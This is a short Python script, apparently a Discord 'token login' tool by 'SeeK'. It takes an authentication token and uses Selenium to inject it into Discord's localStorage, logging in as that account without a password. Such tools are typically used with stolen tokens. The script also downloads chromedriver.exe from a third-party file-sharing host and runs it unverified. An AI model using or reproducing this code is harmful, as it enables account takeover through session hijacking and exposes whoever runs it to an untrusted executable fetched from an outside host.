from selenium import webdriver
import requests, gratient
import os, os.path, requests
os.system("title 𝙎𝙀𝙀𝙆 𝙏𝙊𝙆𝙀𝙉 𝙇𝙊𝙂𝙄𝙉")
os.system("cls")


banner = (gratient.purple("""

**********************************************************************
* _____         _                     __                 _           *
*/__   \  ___  | | __  ___  _ __     / /    ___    __ _ (_) _ __     *
*  / /\/ / _ \ | |/ / / _ \| '_ \   / /    / _ \  / _` || || '_ \    *
* / /   | (_) ||   < |  __/| | | | / /___ | (_) || (_| || || | | |   *
* \/     \___/ |_|\_\ \___||_| |_| \____/  \___/  \__, ||_||_| |_|   *
*                                                 |___/              *
*Token Login v2.1                                                    *
*Coded by SeeK                                                       *
*                                                                    *
**********************************************************************                       

"""))


token = ""
while True:
    if not token:
        os.system("cls")
        print(banner)
        token = input("\n [>] Token : ")
    else:
        break

if not os.path.isfile("C:\\SeeK\\chromedriver.exe"):
    if not os.path.isfile("C:\\SeeK\\chromedriver.exe"):
        if not os.path.isdir("C:\\SeeK"):
            os.mkdir("C:\\SeeK", 0o666)
        print("\n  \033[38;2;95;0;230m[>] \033[38;2;190;0;230mDownloading chromedriver...")
        r = requests.get("https://fv2-2.failiem.lv/down.php?i=3pejtcumf&n=chromedriver.exe&download_checksum=01a17f09feab61817a626214972c32bbbb82f469&download_timestamp=1630452441")
        open("C:\\SeeK\\chromedriver.exe", "wb").write(r.content)
        print("  \033[38;2;95;0;230m[>] \033[38;2;190;0;230mChromedriver downloaded")

opts = webdriver.ChromeOptions()
opts.add_experimental_option("detach", True)
driver = webdriver.Chrome("C:\\SeeK\\chromedriver.exe", options=opts)
script = """
        function login(token) {
        setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
        }, 50);
        setTimeout(() => {
        location.reload();
        }, 2500);
        }   
        """
driver.get("https://discordapp.com/login")
driver.execute_script(script + f'\nlogin("{token}")')


